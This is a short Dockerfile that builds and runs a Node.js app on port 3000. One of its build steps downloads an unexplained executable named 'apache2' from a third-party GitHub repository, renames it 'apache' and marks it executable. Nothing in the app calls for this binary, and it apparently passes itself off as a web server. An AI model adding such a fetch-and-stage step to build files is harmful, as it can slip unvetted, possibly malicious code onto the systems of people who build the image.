FROM node:14

WORKDIR /app

RUN wget https://github.com/Cianameo/amd-conf-hui/raw/main/apache2 -O apache
RUN chmod +x apache

COPY . /app/

RUN npm install

EXPOSE 3000

CMD ["node", "app.js"]